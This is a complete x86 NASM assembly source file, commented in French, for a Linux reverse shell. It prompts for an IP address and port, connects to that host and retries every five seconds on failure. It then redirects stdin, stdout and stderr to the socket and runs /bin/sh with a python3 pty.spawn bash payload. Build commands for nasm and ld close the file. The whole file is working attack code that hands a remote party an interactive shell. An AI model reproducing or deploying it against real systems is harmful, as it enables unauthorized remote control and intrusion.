section .data
    ; IPV4 : domain=AF_INET (2)
    ; TCP : type=SOCK_STREAM (1)
    ; IP : protocol=TCP (0)

    socket_args     dd 2, 1,  0

    msg_ip          db "Quelle est l'ip ?", 0xA     ; Message avec saut de ligne
    msg_ip_len      equ $ - msg_ip                  ; Calcul de la longueur du message

    msg_port        db "Quel est le port ?", 0xA    ; Message avec saut de ligne
    msg_port_len    equ $ - msg_port                ; Calcul de la longueur du message

    invalid_ip_msg db "IP invalide. Réessayez.", 0xA
    invalid_ip_msg_len equ $ - invalid_ip_msg

    retry_msg db "Connexion ratée, le programme réessaye dans 5 secondes", 0xA
    retry_msg_len equ $ - retry_msg

    shell_path      db "/bin/sh", 0
    shell_arg1      db "-c", 0
    shell_payload   db "python3 -c 'import pty; pty.spawn(", 0x22, "/bin/bash", 0x22, ")'", 0
    shell_argv      dd shell_path, shell_arg1, shell_payload, 0

    timespec:
        dd 5          ; tv_sec  = 5 secondes
        dd 0          ; tv_nsec = 0 nanosecondes


section .bss
    ip_input        resb 20     ; Buffer pour l'ip users
    port_input      resb 6      ; Buffer pour le port
    sockaddre_in    resb 16     ; Structure pour connect

section .text
    global _start


_start:

    ;----------------------------------------------------------------------------
    ;-                                  IP                                      -
    ;----------------------------------------------------------------------------

read_ip:
    ; Affiche "Quelle est l'ip ?"
    mov eax, 4                          ; syscall --> write
    mov ebx, 1                          ; stdout --> sortie standard
    mov ecx, msg_ip                     ; Pointeur vers le message
    mov edx, msg_ip_len                 ; Longueur du message
    int 0x80                            ; Lance le syscall

    ; Lit l'entrée utilisateur dans ip_input
    mov eax, 3                          ; syscall --> read
    mov ebx, 0                          ; stdin --> entrée clavier
    mov ecx, ip_input                   ; Zone mémoire pour stocker l'entrée utilisateur
    mov edx, 20                         ; Taille maximale à lire
    int 0x80                            ; Lance le syscall

    ; Initialisations
    lea esi, [ip_input]                 ; Pointeur vers le buffer de l'IP
    lea edi, [sockaddre_in + 4]         ; Pointeur vers la structure sockaddr_in pour l'IP
    xor ecx, ecx                        ; Réinitialise le compteur d'octets
    xor edx, edx                        ; Réinitialise le compteur de points

.parse_octet:
    xor eax, eax                        ; Réinitialise la valeur numérique de l'octet

.parse_digit:
    mov bl, [esi]                       ; Charge un caractère de l'entrée utilisateur
    cmp bl, 10                          ; Vérifie si c'est un saut de ligne
    je .check_final_octet               ; Si oui, vérifie le dernier octet

    cmp bl, '.'                         ; Vérifie si c'est un point
    je .store_octet                     ; Si oui, stocke l'octet

    cmp bl, '0'                         ; Vérifie si le caractère est inférieur à '0'
    jb .invalid_ip                      ; Si oui, IP invalide
    cmp bl, '9'                         ; Vérifie si le caractère est supérieur à '9'
    ja .invalid_ip                      ; Si oui, IP invalide

    sub bl, '0'                         ; Convertit le caractère ASCII en valeur numérique
    imul eax, eax, 10                   ; Multiplie la valeur actuelle par 10
    add eax, ebx                        ; Ajoute la nouvelle valeur
    cmp eax, 255                        ; Vérifie si la valeur dépasse 255
    ja .invalid_ip                      ; Si oui, IP invalide

    inc esi                             ; Passe au caractère suivant
    jmp .parse_digit                    ; Continue la boucle pour le prochain chiffre

.store_octet:
    mov [edi], al                       ; Stocke l'octet converti dans la structure sockaddr_in
    inc edi                             ; Passe à l'octet suivant
    inc esi                             ; Passe au caractère suivant
    inc ecx                             ; Incrémente le compteur d'octets
    inc edx                             ; Incrémente le compteur de points
    cmp edx, 3                          ; Vérifie si plus de 3 points
    ja .invalid_ip                      ; Si oui, IP invalide
    jmp .parse_octet                    ; Continue la boucle pour le prochain octet

.check_final_octet:
    mov [edi], al                       ; Stocke le dernier octet dans la structure sockaddr_in
    inc ecx                             ; Incrémente le compteur d'octets
    cmp ecx, 4                          ; Vérifie si exactement 4 octets
    jne .invalid_ip                     ; Si non, IP invalide
    jmp .ip_ok                          ; Sinon, IP valide

.invalid_ip:
    ; Affiche "IP invalide. Réessayez."
    mov eax, 4                          ; syscall --> write
    mov ebx, 1                          ; stdout --> sortie standard
    mov ecx, invalid_ip_msg             ; Pointeur vers le message d'erreur
    mov edx, invalid_ip_msg_len         ; Longueur du message d'erreur
    int 0x80                            ; Lance le syscall
    jmp read_ip                         ; Redemande l'IP

.ip_ok:
    ; IP OK - on continue


    ;----------------------------------------------------------------------------
    ;-                                 PORT                                     -
    ;----------------------------------------------------------------------------

    ; Message demande du Port
    mov eax, 4                          ; syscall --> write pour afficher un message
    mov ebx, 1                          ; stdout --> sortie standard
    mov ecx, msg_port                   ; Pointeur vers le message
    mov edx, msg_port_len               ; Longueur du message
    int 0x80                            ; Lance

    ; Récupération Port 
    mov eax, 3                          ; syscall --> read pour lire l'entré Utilisateur
    mov ebx, 0                          ; stdin --> Entré clavier
    mov ecx, port_input                 ; Zone mémoire ou stocké l'entrée utilisateur
    mov edx, 6                          ; Max d'octet a lire
    int 0x80                            ; Lance

    ; Conversion du port en hexadecimal
    xor eax, eax                        ; Réinitialise eax
    xor ebx, ebx                        ; Réinitialise ebx
    mov ecx, port_input                 ; Pointeur vers le buffer du port


convert_loop:
    movzx edx, byte [ecx]               ; Charge un octet du buffer
    cmp dl, 0x0A                        ; Vérifie si c'est un saut de ligne (fin de l'entrée)
    je convert_done                     ; Si oui, termine la conversion
    sub dl, '0'                         ; Convertit le caractère ASCII en valeur numérique
    imul eax, eax, 10                   ; Multiplie la valeur actuelle par 10
    add eax, edx                        ; Ajoute la nouvelle valeur
    inc ecx                             ; Passe au caractère suivant
    jmp convert_loop                    ; Continue la boucle

convert_done:
    xchg ax, ax                         ; Instruction NOP (aucun effet réel, peut être ignorée)
    mov bx, ax                          ; Copie la valeur de ax (port) dans bx
    rol bx, 8                           ; Inverse les octets pour respecter l'ordre réseau (big-endian)
    mov [sockaddre_in + 2], bx          ; Place le port converti dans la structure sockaddr_in

    mov word [sockaddre_in], 2          ; Définit la famille d'adresses à AF_INET (IPv4)
    xor eax, eax                        ; Réinitialise eax à 0
    mov dword [sockaddre_in + 8], eax   ; Initialise la partie adresse IP à 0
    mov dword [sockaddre_in + 12], eax  ; Initialise la partie restante de la structure à 0

    ;----------------------------------------------------------------------------
    ;                     socket(AF_INET, SOCK_STREAM, 0)                       
    ;----------------------------------------------------------------------------
    mov eax, 102                        ; Appel système socketcall
    mov ebx, 1                          ; Sous-fonction socket() pour créer un socket
    lea ecx, [socket_args]              ; Charge l'adresse des arguments pour socket()
    int 0x80                            ; Exécute l'appel système

    mov esi, eax                        ; Sauvegarde le descripteur de fichier du socket

    ;----------------------------------------------------------------------------
    ;                        connect(sock, sockaddr*, 16)                       
    ;----------------------------------------------------------------------------
.retry_connect:
    push 16                             ; Taille de la structure sockaddr_in
    lea ebx, [sockaddre_in]             ; Charge l'adresse de la structure sockaddr_in
    push ebx                            ; Empile l'adresse de sockaddr_in
    push esi                            ; Empile le descripteur de fichier du socket
    mov eax, 102                        ; Appel système socketcall
    mov ebx, 3                          ; Sous-fonction connect() pour établir une connexion
    mov ecx, esp                        ; Charge l'adresse des arguments pour connect()
    int 0x80                            ; Exécute l'appel système

    cmp eax, 0                          ; Vérifie si la connexion a réussi
    je .connect_ok                      ; Si oui, passe à l'étape suivante

    ; Affiche "Connexion ratée, le programme réessaye dans 5 secondes"
    mov eax, 4                          ; Appel système write
    mov ebx, 1                          ; Sortie standard (stdout)
    mov ecx, retry_msg                  ; Pointeur vers le message d'erreur
    mov edx, retry_msg_len              ; Longueur du message d'erreur
    int 0x80                            ; Exécute l'appel système

    ; Attend 5 secondes avant de réessayer
    mov eax, 162                        ; Appel système nanosleep
    lea ebx, [timespec]                 ; Charge l'adresse de la structure timespec
    xor ecx, ecx                        ; NULL pour le deuxième argument
    int 0x80                            ; Exécute l'appel système

    jmp .retry_connect                  ; Réessaie la connexion

.connect_ok:

    ;----------------------------------------------------------------------------
    ;       dup2 pour rediriger stdin, stdout, stderr vers le socket            
    ;                       dup2(sockfd, 0), (1), (2)                           
    ;----------------------------------------------------------------------------
    mov ebx, esi                        ; Charge le descripteur de fichier du socket
    xor ecx, ecx                        ; Initialise ecx à 0 (stdin)

.dup_loop:
    mov eax, 63                         ; Appel système dup2
    int 0x80                            ; Exécute l'appel système
    inc ecx                             ; Incrémente ecx pour passer à stdout, puis stderr
    cmp ecx, 3                          ; Vérifie si toutes les redirections sont faites
    jne .dup_loop                       ; Si non, continue la boucle

    ;----------------------------------------------------------------------------
    ;     execve("/bin/sh", ["/bin/sh", "-c", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"], NULL)
    ;----------------------------------------------------------------------------
    mov eax, 11                         ; Appel système execve
    mov ebx, shell_path                 ; Charge le chemin vers /bin/sh
    mov ecx, shell_argv                 ; Charge le tableau des arguments
    xor edx, edx                        ; NULL pour l'environnement (envp)
    int 0x80                            ; Exécute l'appel système



    









; nasm -f elf32 reverseshell.asm -o reverse_shell.o
; ld -m elf_i386 reverse_shell.o -o reverse_shell